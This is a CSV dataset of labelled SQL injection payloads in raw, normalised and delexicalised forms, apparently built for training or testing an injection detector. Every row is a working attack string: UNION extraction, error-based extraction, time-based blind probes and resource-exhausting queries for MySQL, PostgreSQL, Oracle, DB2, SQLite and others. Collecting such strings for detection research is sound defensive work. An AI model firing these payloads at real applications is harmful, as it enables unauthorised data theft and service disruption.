payload_raw,payload_norm,payload_delex,label,is_obfuscated,sqli_type_hint,source
"-2248'+  (  select wuow where 4421  =  4421 union all select 4421,4421,4421,4421,4421,4421--","-2248'+ ( select wuow where 4421 = 4421 union all select 4421,4421,4421,4421,4421,4421--","-<NUM>'+ ( select wuow where <NUM> = <NUM> union all select <NUM>,<NUM>,<NUM>,<NUM>,<NUM>,<NUM>--",1,True,,sqli_dataset
"1%'   )    )     )   and 3580  =    (  select count  (  *  )   from domain.domains as t1,domain.columns as t2,domain.tables as t3  )  --","1%' ) ) ) and 3580 = ( select count ( * ) from domain.domains as t1,domain.columns as t2,domain.tables as t3 ) --","<NUM>%' ) ) ) and <NUM> = ( select count ( * ) from domain.domains as t1,domain.columns as t2,domain.tables as t3 ) --",1,False,,sqli_dataset
1  )   as mtda where 3951  =  3951,1 ) as mtda where 3951 = 3951,<NUM> ) as mtda where <NUM> = <NUM>,1,False,,sqli_dataset
"1'   )    )     )   or updatexml  (  1808,concat  (  0x2e,0x7171706a71,  (  select   (  elt  (  1808  =  1808,1   )    )     )  ,0x717a767a71  )  ,8666  )   and    (    (     (  'eugs'  =  'eugs","1' ) ) ) or updatexml ( 1808,concat ( 0x2e,0x7171706a71, ( select ( elt ( 1808 = 1808,1 ) ) ) ,0x717a767a71 ) ,8666 ) and ( ( ( 'eugs' = 'eugs",<NUM><STR>eugs<STR>eugs,1,True,,sqli_dataset
1'  )   where 7908  =  7908 or sleep  (  5  )  --,1' ) where 7908 = 7908 or sleep ( 5 ) --,<NUM>' ) where <NUM> = <NUM> or sleep ( <NUM> ) --,1,False,,sqli_dataset
"-1438 where 6759  =  6759 union all select 6759,6759#","-1438 where 6759 = 6759 union all select 6759,6759#","-<NUM> where <NUM> = <NUM> union all select <NUM>,<NUM>#",1,False,,sqli_dataset
"iif  (  9190  =  5059,1,1/0  )","iif ( 9190 = 5059,1,1/0 )","iif ( <NUM> = <NUM>,<NUM>,<NUM>/<NUM> )",1,False,,sqli_dataset
"1""   )    )     )   and 3202  =  like  (  'abcdefg',upper  (  hex  (  randomblob  (  500000000/2   )    )      )    )    and    (    (     (  ""oohx"" like ""oohx","1"" ) ) ) and 3202 = like ( 'abcdefg',upper ( hex ( randomblob ( 500000000/2 ) ) ) ) and ( ( ( ""oohx"" like ""oohx",<NUM><STR>oohx<STR>oohx,1,False,,sqli_dataset
"1"" where 2365  =  2365 and 3707  =    (  select count  (  *  )   from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3  )  --","1"" where 2365 = 2365 and 3707 = ( select count ( * ) from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3 ) --","<NUM>"" where <NUM> = <NUM> and <NUM> = ( select count ( * ) from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3 ) --",1,False,,sqli_dataset
(  select chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  7812  =  7812  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113  )   from dual  ),( select chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) || ( select ( case when ( 7812 = 7812 ) then 1 else 0 end ) from dual ) ||chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) from dual ),( select chr ( <NUM> ) ||chr ( <NUM> ) ||chr ( <NUM> ) ||chr ( <NUM> ) ||chr ( <NUM> ) || ( select ( case when ( <NUM> = <NUM> ) then <NUM> else <NUM> end ) from dual ) ||chr ( <NUM> ) ||chr ( <NUM> ) ||chr ( <NUM> ) ||chr ( <NUM> ) ||chr ( <NUM> ) from dual ),1,False,,sqli_dataset
1'  )   and   (  1414  =  4775  )  *4775 and   (  'mlmw'  =  'mlmw,1' ) and ( 1414 = 4775 ) *4775 and ( 'mlmw' = 'mlmw,<NUM><STR>mlmw<STR>mlmw,1,False,,sqli_dataset
"select count  (  *  )   from generate_series  (  1,5000000  )   and    (    (   'wmoo' like 'wmoo","select count ( * ) from generate_series ( 1,5000000 ) and ( ( 'wmoo' like 'wmoo","select count ( * ) from generate_series ( <NUM>,<NUM> ) and ( ( <STR> like 'wmoo",1,False,,sqli_dataset
"1'||  (  select 'bpml' where 7360  =  7360 or extractvalue  (  1297,concat  (  0x5c,0x7171706a71,  (  select   (  elt  (  1297  =  1297,1   )    )     )  ,0x717a767a71   )    )     )  ||'","1'|| ( select 'bpml' where 7360 = 7360 or extractvalue ( 1297,concat ( 0x5c,0x7171706a71, ( select ( elt ( 1297 = 1297,1 ) ) ) ,0x717a767a71 ) ) ) ||'",<NUM><STR>bpml<STR>,1,True,,sqli_dataset
"1'  )   where 9221  =  9221 and   (  select 2*  (  if   (    (   select * from   (  select concat  (  0x7171706a71,  (  select   (  elt  (  3484  =  3484,1   )    )     )  ,0x717a767a71,0x78   )    )   s  )  , 8446744073709551610, 8446744073709551610   )    )     )  --","1' ) where 9221 = 9221 and ( select 2* ( if ( ( select * from ( select concat ( 0x7171706a71, ( select ( elt ( 3484 = 3484,1 ) ) ) ,0x717a767a71,0x78 ) ) s ) , 8446744073709551610, 8446744073709551610 ) ) ) --","<NUM>' ) where <NUM> = <NUM> and ( select <NUM>* ( if ( ( select * from ( select concat ( 0x7171706a71, ( select ( elt ( <NUM> = <NUM>,<NUM> ) ) ) ,0x717a767a71,0x78 ) ) s ) , <NUM>, <NUM> ) ) ) --",1,True,,sqli_dataset
"1  )   where 9338  =  9338 or extractvalue  (  1297,concat  (  0x5c,0x7171706a71,  (  select   (  elt  (  1297  =  1297,1   )    )     )  ,0x717a767a71   )    )   --","1 ) where 9338 = 9338 or extractvalue ( 1297,concat ( 0x5c,0x7171706a71, ( select ( elt ( 1297 = 1297,1 ) ) ) ,0x717a767a71 ) ) --","<NUM> ) where <NUM> = <NUM> or extractvalue ( <NUM>,concat ( 0x5c,0x7171706a71, ( select ( elt ( <NUM> = <NUM>,<NUM> ) ) ) ,0x717a767a71 ) ) --",1,True,,sqli_dataset
"1  )   as qjbd where 2808  =  2808   (  select   (  case when   (  5451  =  5451  )   then regexp_substring  (  repeat  (  right  (  char  (  5451  )  ,0  )  ,500000000  )  ,null  )   else char  (  108  )  ||char  (  76  )  ||char  (  112  )  ||char  (  116  )   end  )   from information_schema.system_users  )  --","1 ) as qjbd where 2808 = 2808 ( select ( case when ( 5451 = 5451 ) then regexp_substring ( repeat ( right ( char ( 5451 ) ,0 ) ,500000000 ) ,null ) else char ( 108 ) ||char ( 76 ) ||char ( 112 ) ||char ( 116 ) end ) from information_schema.system_users ) --","<NUM> ) as qjbd where <NUM> = <NUM> ( select ( case when ( <NUM> = <NUM> ) then regexp_substring ( repeat ( right ( char ( <NUM> ) ,<NUM> ) ,<NUM> ) ,null ) else char ( <NUM> ) ||char ( <NUM> ) ||char ( <NUM> ) ||char ( <NUM> ) end ) from information_schema.system_users ) --",1,False,,sqli_dataset
1' or 6793  =    (  select 6793 from pg_sleep  (  5   )    )    and 'dogx'  =  'dogx,1' or 6793 = ( select 6793 from pg_sleep ( 5 ) ) and 'dogx' = 'dogx,<NUM><STR>dogx<STR>dogx,1,False,,sqli_dataset
-1890'   )    )     )   or 8526  =  1389 and    (    (     (  'ecgt'  =  'ecgt,-1890' ) ) ) or 8526 = 1389 and ( ( ( 'ecgt' = 'ecgt,-<NUM><STR>ecgt<STR>ecgt,1,False,,sqli_dataset
1  )   where 7026  =  7026,1 ) where 7026 = 7026,<NUM> ) where <NUM> = <NUM>,1,False,,sqli_dataset
"-6388'+  (  select 'jqld' where 8600  =  8600 union all select 8600,8600#","-6388'+ ( select 'jqld' where 8600 = 8600 union all select 8600,8600#","-<NUM><STR>jqld' where <NUM> = <NUM> union all select <NUM>,<NUM>#",1,True,,sqli_dataset
"1""   )    )    and 2006  =  2006","1"" ) ) and 2006 = 2006","<NUM>"" ) ) and <NUM> = <NUM>",1,False,,sqli_dataset
"1""  )   or char  (  75  )  ||char  (  70  )  ||char  (  99  )  ||char  (  83  )    =  regexp_substring  (  repeat  (  left  (  crypt_key  (  char  (  65  )  ||char  (  69  )  ||char  (  83  )  ,null  )  ,0  )  ,500000000  )  ,null  )  --","1"" ) or char ( 75 ) ||char ( 70 ) ||char ( 99 ) ||char ( 83 ) = regexp_substring ( repeat ( left ( crypt_key ( char ( 65 ) ||char ( 69 ) ||char ( 83 ) ,null ) ,0 ) ,500000000 ) ,null ) --","<NUM>"" ) or char ( <NUM> ) ||char ( <NUM> ) ||char ( <NUM> ) ||char ( <NUM> ) = regexp_substring ( repeat ( left ( crypt_key ( char ( <NUM> ) ||char ( <NUM> ) ||char ( <NUM> ) ,null ) ,<NUM> ) ,<NUM> ) ,null ) --",1,False,,sqli_dataset
1'   )    )    and   (  select * from   (  select  (  sleep  (  5   )    )     )  fzno  )   and    (    (   'wevl'  =  'wevl,1' ) ) and ( select * from ( select ( sleep ( 5 ) ) ) fzno ) and ( ( 'wevl' = 'wevl,<NUM><STR>wevl<STR>wevl,1,False,,sqli_dataset
"-1425""  )   where 8056  =  8056 or elt  (  1032  =  1032,3623  )  --","-1425"" ) where 8056 = 8056 or elt ( 1032 = 1032,3623 ) --","-<NUM>"" ) where <NUM> = <NUM> or elt ( <NUM> = <NUM>,<NUM> ) --",1,False,,sqli_dataset
1'   )    )     )   or 4240  =    (  select 4240 from pg_sleep  (  5   )    )   --,1' ) ) ) or 4240 = ( select 4240 from pg_sleep ( 5 ) ) --,<NUM>' ) ) ) or <NUM> = ( select <NUM> from pg_sleep ( <NUM> ) ) --,1,False,,sqli_dataset
"1%'   )    )    union all select null,null,null,null#","1%' ) ) union all select null,null,null,null#","<NUM>%' ) ) union all select null,null,null,null#",1,False,,sqli_dataset
"1'  )   procedure analyse  (  extractvalue  (  5840,concat  (  0x5c,0x7171706a71,  (  select   (  case when   (  5840  =  5840  )   then 1 else 0 end   )    )   ,0x717a767a71   )    )   ,1  )","1' ) procedure analyse ( extractvalue ( 5840,concat ( 0x5c,0x7171706a71, ( select ( case when ( 5840 = 5840 ) then 1 else 0 end ) ) ,0x717a767a71 ) ) ,1 )","<NUM>' ) procedure analyse ( extractvalue ( <NUM>,concat ( 0x5c,0x7171706a71, ( select ( case when ( <NUM> = <NUM> ) then <NUM> else <NUM> end ) ) ,0x717a767a71 ) ) ,<NUM> )",1,True,,sqli_dataset
"1'||  (  select 'hvqw' from dual where 4423  =  4423 union all select null,null,null--","1'|| ( select 'hvqw' from dual where 4423 = 4423 union all select null,null,null--","<NUM><STR>hvqw' from dual where <NUM> = <NUM> union all select null,null,null--",1,False,,sqli_dataset
end and    (    (   'eqoc' like 'eqoc,end and ( ( 'eqoc' like 'eqoc,end and ( ( <STR> like 'eqoc,1,False,,sqli_dataset
1'  )   as lewd where 3118  =  3118 order by 1--,1' ) as lewd where 3118 = 3118 order by 1--,<NUM>' ) as lewd where <NUM> = <NUM> order by <NUM>--,1,False,,sqli_dataset
"-6076""   )    )    or 8277  =  4757","-6076"" ) ) or 8277 = 4757","-<NUM>"" ) ) or <NUM> = <NUM>",1,False,,sqli_dataset
"1""  )   or 4240  =    (  select 4240 from pg_sleep  (  5   )    )   --","1"" ) or 4240 = ( select 4240 from pg_sleep ( 5 ) ) --","<NUM>"" ) or <NUM> = ( select <NUM> from pg_sleep ( <NUM> ) ) --",1,False,,sqli_dataset
"-6680""   )    )     )   union all select 2564,2564,2564,2564,2564,2564#","-6680"" ) ) ) union all select 2564,2564,2564,2564,2564,2564#","-<NUM>"" ) ) ) union all select <NUM>,<NUM>,<NUM>,<NUM>,<NUM>,<NUM>#",1,False,,sqli_dataset
1   )    )     )   and 8594  =    (  select 8594 from pg_sleep  (  5   )    )   --,1 ) ) ) and 8594 = ( select 8594 from pg_sleep ( 5 ) ) --,<NUM> ) ) ) and <NUM> = ( select <NUM> from pg_sleep ( <NUM> ) ) --,1,False,,sqli_dataset
1'  )   as upgb where 2031  =  2031,1' ) as upgb where 2031 = 2031,<NUM>' ) as upgb where <NUM> = <NUM>,1,False,,sqli_dataset
"1' where 6795  =  6795 and 8635  =    (  select count  (  *  )   from generate_series  (  1,5000000   )    )   --","1' where 6795 = 6795 and 8635 = ( select count ( * ) from generate_series ( 1,5000000 ) ) --","<NUM>' where <NUM> = <NUM> and <NUM> = ( select count ( * ) from generate_series ( <NUM>,<NUM> ) ) --",1,False,,sqli_dataset
"1' and char  (  111  )  ||char  (  77  )  ||char  (  121  )  ||char  (  88  )    =  regexp_substring  (  repeat  (  left  (  crypt_key  (  char  (  65  )  ||char  (  69  )  ||char  (  83  )  ,null  )  ,0  )  ,500000000  )  ,null  )   and 'jjxn'  =  'jjxn","1' and char ( 111 ) ||char ( 77 ) ||char ( 121 ) ||char ( 88 ) = regexp_substring ( repeat ( left ( crypt_key ( char ( 65 ) ||char ( 69 ) ||char ( 83 ) ,null ) ,0 ) ,500000000 ) ,null ) and 'jjxn' = 'jjxn",<NUM><STR>jjxn<STR>jjxn,1,False,,sqli_dataset
select case when 2599  =  7035 then 1 else null end--,select case when 2599 = 7035 then 1 else null end--,select case when <NUM> = <NUM> then <NUM> else null end--,1,False,,sqli_dataset
"1%' or row  (  1045,7562  )  >  (  select count  (  *  )  ,concat  (  0x7171706a71,  (  select   (  elt  (  1045  =  1045,1   )    )     )  ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )   x from   (  select 8488 union select 5584 union select 3051 union select 1210  )  a group by x  )   and '%'  =  '","1%' or row ( 1045,7562 ) > ( select count ( * ) ,concat ( 0x7171706a71, ( select ( elt ( 1045 = 1045,1 ) ) ) ,0x717a767a71,floor ( rand ( 0 ) *2 ) ) x from ( select 8488 union select 5584 union select 3051 union select 1210 ) a group by x ) and '%' = '",<NUM>%<STR>%<STR>,1,True,,sqli_dataset
"1""  )   as eibf where 5026  =  5026 and 4386  =  utl_inaddr.get_host_address  (  chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  4386  =  4386  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )   --","1"" ) as eibf where 5026 = 5026 and 4386 = utl_inaddr.get_host_address ( chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) || ( select ( case when ( 4386 = 4386 ) then 1 else 0 end ) from dual ) ||chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ) --","<NUM>"" ) as eibf where <NUM> = <NUM> and <NUM> = utl_inaddr.get_host_address ( chr ( <NUM> ) ||chr ( <NUM> ) ||chr ( <NUM> ) ||chr ( <NUM> ) ||chr ( <NUM> ) || ( select ( case when ( <NUM> = <NUM> ) then <NUM> else <NUM> end ) from dual ) ||chr ( <NUM> ) ||chr ( <NUM> ) ||chr ( <NUM> ) ||chr ( <NUM> ) ||chr ( <NUM> ) ) --",1,False,,sqli_dataset
select   (  case when   (  8403  =  7151  )   then 8403 else cast  (  1 as int  )  /  (  select 0 from dual  )   end  )   from dual--,select ( case when ( 8403 = 7151 ) then 8403 else cast ( 1 as int ) / ( select 0 from dual ) end ) from dual--,select ( case when ( <NUM> = <NUM> ) then <NUM> else cast ( <NUM> as int ) / ( select <NUM> from dual ) end ) from dual--,1,False,,sqli_dataset
"1'||  (  select 'epjf' from dual where 8584  =  8584 and 8189  =    (  select count  (  *  )   from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3  )  --","1'|| ( select 'epjf' from dual where 8584 = 8584 and 8189 = ( select count ( * ) from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3 ) --","<NUM><STR>epjf' from dual where <NUM> = <NUM> and <NUM> = ( select count ( * ) from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3 ) --",1,False,,sqli_dataset
"1 or updatexml  (  1808,concat  (  0x2e,0x7171706a71,  (  select   (  elt  (  1808  =  1808,1   )    )     )  ,0x717a767a71  )  ,8666  )  # fzni","1 or updatexml ( 1808,concat ( 0x2e,0x7171706a71, ( select ( elt ( 1808 = 1808,1 ) ) ) ,0x717a767a71 ) ,8666 ) # fzni","<NUM> or updatexml ( <NUM>,concat ( 0x2e,0x7171706a71, ( select ( elt ( <NUM> = <NUM>,<NUM> ) ) ) ,0x717a767a71 ) ,<NUM> ) # fzni",1,True,,sqli_dataset
1  )   where 9860  =  9860 and 4443  =  4111--,1 ) where 9860 = 9860 and 4443 = 4111--,<NUM> ) where <NUM> = <NUM> and <NUM> = <NUM>--,1,False,,sqli_dataset
"1""  )   where 3122  =  3122 and sleep  (  5  )  #","1"" ) where 3122 = 3122 and sleep ( 5 ) #","<NUM>"" ) where <NUM> = <NUM> and sleep ( <NUM> ) #",1,False,,sqli_dataset
"1""   )    )    as eglv where 7412  =  7412 union all select null#","1"" ) ) as eglv where 7412 = 7412 union all select null#","<NUM>"" ) ) as eglv where <NUM> = <NUM> union all select null#",1,False,,sqli_dataset
1 and sleep  (  5  )  -- ruuv,1 and sleep ( 5 ) -- ruuv,<NUM> and sleep ( <NUM> ) -- ruuv,1,False,,sqli_dataset
1  )   rlike   (  select   (  case when   (  8488  =  1270  )   then 1 else 0x28 end   )    ),1 ) rlike ( select ( case when ( 8488 = 1270 ) then 1 else 0x28 end ) ),<NUM> ) rlike ( select ( case when ( <NUM> = <NUM> ) then <NUM> else 0x28 end ) ),1,True,,sqli_dataset
"1%' union all select null,null,null#","1%' union all select null,null,null#","<NUM>%' union all select null,null,null#",1,False,,sqli_dataset
"1'   )    )     )   and 6537  =  dbms_pipe.receive_message  (  chr  (  76  )  ||chr  (  116  )  ||chr  (  117  )  ||chr  (  65  )  ,5  )   and    (    (     (  'cimm' like 'cimm","1' ) ) ) and 6537 = dbms_pipe.receive_message ( chr ( 76 ) ||chr ( 116 ) ||chr ( 117 ) ||chr ( 65 ) ,5 ) and ( ( ( 'cimm' like 'cimm",<NUM><STR>cimm<STR>cimm,1,False,,sqli_dataset
1'||  (  select 'omeg' from dual where 4751  =  4751,1'|| ( select 'omeg' from dual where 4751 = 4751,<NUM><STR>omeg' from dual where <NUM> = <NUM>,1,False,,sqli_dataset
"1""   )    )     )   or 8466  =  benchmark  (  5000000,md5  (  0x694a4745   )    )    and    (    (     (  ""ijag""  =  ""ijag","1"" ) ) ) or 8466 = benchmark ( 5000000,md5 ( 0x694a4745 ) ) and ( ( ( ""ijag"" = ""ijag",<NUM><STR>ijag<STR>ijag,1,True,,sqli_dataset
"-2314%'   )    )    union all select 4612,4612--","-2314%' ) ) union all select 4612,4612--","-<NUM>%' ) ) union all select <NUM>,<NUM>--",1,False,,sqli_dataset
1%' and 7533  =  7533 and '%'  =  ',1%' and 7533 = 7533 and '%' = ',<NUM>%<STR>%<STR>,1,False,,sqli_dataset
"1',extractvalue  (  9788,concat  (  0x5c,0x7171706a71,  (  select   (  elt  (  9788  =  9788,1   )    )     )  ,0x717a767a71   )    )","1',extractvalue ( 9788,concat ( 0x5c,0x7171706a71, ( select ( elt ( 9788 = 9788,1 ) ) ) ,0x717a767a71 ) )","<NUM>',extractvalue ( <NUM>,concat ( 0x5c,0x7171706a71, ( select ( elt ( <NUM> = <NUM>,<NUM> ) ) ) ,0x717a767a71 ) )",1,True,,sqli_dataset
"1'  )   as eymt where 3911  =  3911 or 4411  =    (  select count  (  *  )   from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7  )  --","1' ) as eymt where 3911 = 3911 or 4411 = ( select count ( * ) from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7 ) --","<NUM>' ) as eymt where <NUM> = <NUM> or <NUM> = ( select count ( * ) from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7 ) --",1,False,,sqli_dataset
"1'   )    )    or 8514  =  benchmark  (  5000000,md5  (  0x544d5a4c   )    )   #","1' ) ) or 8514 = benchmark ( 5000000,md5 ( 0x544d5a4c ) ) #","<NUM>' ) ) or <NUM> = benchmark ( <NUM>,md5 ( 0x544d5a4c ) ) #",1,True,,sqli_dataset
"1'  )   where 8211  =  8211 union all select null,null,null,null,null#","1' ) where 8211 = 8211 union all select null,null,null,null,null#","<NUM>' ) where <NUM> = <NUM> union all select null,null,null,null,null#",1,False,,sqli_dataset
"-1083'  )   union all select 9993,9993,9993,9993,9993,9993,9993,9993,9993--","-1083' ) union all select 9993,9993,9993,9993,9993,9993,9993,9993,9993--","-<NUM>' ) union all select <NUM>,<NUM>,<NUM>,<NUM>,<NUM>,<NUM>,<NUM>,<NUM>,<NUM>--",1,False,,sqli_dataset
"-6561""   )    )     )   or 6872  =  6872 and    (    (     (  ""azqp"" like ""azqp","-6561"" ) ) ) or 6872 = 6872 and ( ( ( ""azqp"" like ""azqp",-<NUM><STR>azqp<STR>azqp,1,False,,sqli_dataset
"1%""   )    )     )   and 3707  =    (  select count  (  *  )   from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3  )   and    (    (     (  ""%""  =  ""","1%"" ) ) ) and 3707 = ( select count ( * ) from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3 ) and ( ( ( ""%"" = """,<NUM>%<STR>%<STR>,1,False,,sqli_dataset
"1   )    )    as kycl where 8008  =  8008 or 8384  =  like  (  'abcdefg',upper  (  hex  (  randomblob  (  500000000/2   )    )      )    )   --","1 ) ) as kycl where 8008 = 8008 or 8384 = like ( 'abcdefg',upper ( hex ( randomblob ( 500000000/2 ) ) ) ) --","<NUM> ) ) as kycl where <NUM> = <NUM> or <NUM> = like ( <STR>,upper ( hex ( randomblob ( <NUM>/<NUM> ) ) ) ) --",1,False,,sqli_dataset
"1'   )    )     )   and elt  (  9041  =  6421,6421  )   and    (    (     (  'ixxg' like 'ixxg","1' ) ) ) and elt ( 9041 = 6421,6421 ) and ( ( ( 'ixxg' like 'ixxg",<NUM><STR>ixxg<STR>ixxg,1,False,,sqli_dataset
"1  )   as attr where 8085  =  8085 and 9254  =    (  select count  (  *  )   from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4  )  --","1 ) as attr where 8085 = 8085 and 9254 = ( select count ( * ) from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4 ) --","<NUM> ) as attr where <NUM> = <NUM> and <NUM> = ( select count ( * ) from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4 ) --",1,False,,sqli_dataset
"1"" where 2035  =  2035 and 3824  =  benchmark  (  5000000,md5  (  0x76555642   )    )   --","1"" where 2035 = 2035 and 3824 = benchmark ( 5000000,md5 ( 0x76555642 ) ) --","<NUM>"" where <NUM> = <NUM> and <NUM> = benchmark ( <NUM>,md5 ( 0x76555642 ) ) --",1,True,,sqli_dataset
"-5891 union all select 7103,7103,7103,7103--","-5891 union all select 7103,7103,7103,7103--","-<NUM> union all select <NUM>,<NUM>,<NUM>,<NUM>--",1,False,,sqli_dataset
"1'  )   or   (  select 2*  (  if   (    (   select * from   (  select concat  (  0x7171706a71,  (  select   (  elt  (  8113  =  8113,1   )    )     )  ,0x717a767a71,0x78   )    )   s  )  , 8446744073709551610, 8446744073709551610   )    )     )   and   (  'xgzb'  =  'xgzb","1' ) or ( select 2* ( if ( ( select * from ( select concat ( 0x7171706a71, ( select ( elt ( 8113 = 8113,1 ) ) ) ,0x717a767a71,0x78 ) ) s ) , 8446744073709551610, 8446744073709551610 ) ) ) and ( 'xgzb' = 'xgzb",<NUM><STR>xgzb<STR>xgzb,1,True,,sqli_dataset
